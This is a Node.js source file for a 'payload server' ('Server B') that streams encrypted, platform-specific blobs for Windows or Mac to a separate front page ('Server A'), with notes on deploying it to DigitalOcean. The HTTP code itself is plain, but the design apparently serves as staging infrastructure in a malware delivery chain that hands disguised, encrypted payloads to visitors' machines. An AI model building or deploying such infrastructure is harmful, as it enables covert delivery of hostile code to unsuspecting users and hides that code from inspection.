// Minimal production-ready payload server for Server B (the /data origin).
//
// Routes:
//   GET /data?platform=win|mac   -> { "cipher": "U2FsdGVkX1..." }   (from ./data/data_*.json)
//   GET /data_win.json           -> static fallback (for static hosts that serve the file too)
//   GET /data_mac.json           -> static fallback
//   GET /                        -> index.html if present (optional)
//
// Binds 0.0.0.0 so DigitalOcean / Docker / VM deployments can reach it, and
// listens on process.env.PORT (DigitalOcean injects this automatically).

const http = require('http');
const fs = require('fs');
const path = require('path');

const HOST = process.env.HOST || '0.0.0.0';
const PORT = process.env.PORT || 3000;

// The encrypted payloads live in a "data/" subfolder next to this script.
const DATA_DIR = path.join(__dirname, 'data');

const MIME = {
  '.html': 'text/html; charset=utf-8',
  '.json': 'application/json; charset=utf-8',
  '.js': 'text/javascript; charset=utf-8'
};

function sendJson(res, status, obj) {
  res.writeHead(status, { 'Content-Type': 'application/json; charset=utf-8' });
  res.end(JSON.stringify(obj));
}

function sendFileStream(res, filePath) {
  res.writeHead(200, { 'Content-Type': MIME[path.extname(filePath)] || 'application/octet-stream' });
  fs.createReadStream(filePath).pipe(res);
}

const server = http.createServer((req, res) => {
  const url = new URL(req.url, 'http://localhost');

  // ---- The exact route Server A's index.html calls ----
  if (url.pathname === '/data') {
    const platform = url.searchParams.get('platform');
    if (platform !== 'win' && platform !== 'mac') {
      return sendJson(res, 400, { error: 'platform must be win or mac' });
    }
    const file = path.join(DATA_DIR, 'data_' + platform + '.json');
    if (!fs.existsSync(file)) {
      return sendJson(res, 404, { error: 'data_' + platform + '.json not found' });
    }
    // Send the raw file bytes so the JSON is streamed as-is.
    res.writeHead(200, { 'Content-Type': 'application/json; charset=utf-8' });
    return fs.createReadStream(file).pipe(res);
  }

  // ---- Serve static files ----
  // The data_*.json fallbacks live in the data/ subfolder, so map them explicitly.
  if (url.pathname === '/data_win.json' || url.pathname === '/data_mac.json') {
    const f = path.join(DATA_DIR, url.pathname.replace(/^\//, ''));
    if (fs.existsSync(f)) return sendFileStream(res, f);
    res.writeHead(404, { 'Content-Type': 'text/plain' });
    return res.end('404 Not Found');
  }

  let filePath = path.join(__dirname, url.pathname === '/' ? 'index.html' : url.pathname);

  // Path traversal guard: never serve files outside this folder.
  const root = path.resolve(__dirname);
  if (!filePath.startsWith(root + path.sep) && filePath !== path.join(__dirname, 'index.html')) {
    res.writeHead(403, { 'Content-Type': 'text/plain' });
    return res.end('403 Forbidden');
  }

  const ext = path.extname(filePath);
  if (!MIME[ext]) {
    res.writeHead(404, { 'Content-Type': 'text/plain' });
    return res.end('404 Not Found');
  }
  if (!fs.existsSync(filePath)) {
    res.writeHead(404, { 'Content-Type': 'text/plain' });
    return res.end('404 Not Found');
  }

  sendFileStream(res, filePath);
});

server.listen(PORT, HOST, () => {
  console.log('Server B (payload origin) running at http://' + HOST + ':' + PORT);
  console.log('  GET /data?platform=win -> data/data_win.json');
  console.log('  GET /data?platform=mac -> data/data_mac.json');
});
